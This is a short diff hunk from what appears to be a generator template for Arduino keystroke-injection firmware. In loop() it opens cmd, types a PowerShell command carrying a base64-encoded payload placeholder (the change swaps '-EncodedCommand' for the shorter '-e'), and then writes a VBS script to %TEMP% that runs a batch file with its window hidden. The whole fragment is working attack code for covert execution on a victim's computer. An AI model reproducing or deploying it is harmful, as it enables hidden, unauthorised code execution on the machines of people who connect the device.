@@ -373,7 +373,7 @@ void loop()
   // run through cmd
   CommandAtRunBar("cmd");
   delay(1000);
-  Keyboard.println("powershell -EncodedCommand {powershell_command}");
+  Keyboard.println("powershell -e {powershell_command}");
   delay(4000);
   Keyboard.println("echo Set WshShell = CreateObject(\\"WScript.Shell\\") > %TEMP%\\\\{vbs}");
   Keyboard.println("echo WshShell.Run chr(34) ^& \\"%TEMP%\\\\{bat}\\" ^& Chr(34), 0 >> %TEMP%\\\\{vbs}");
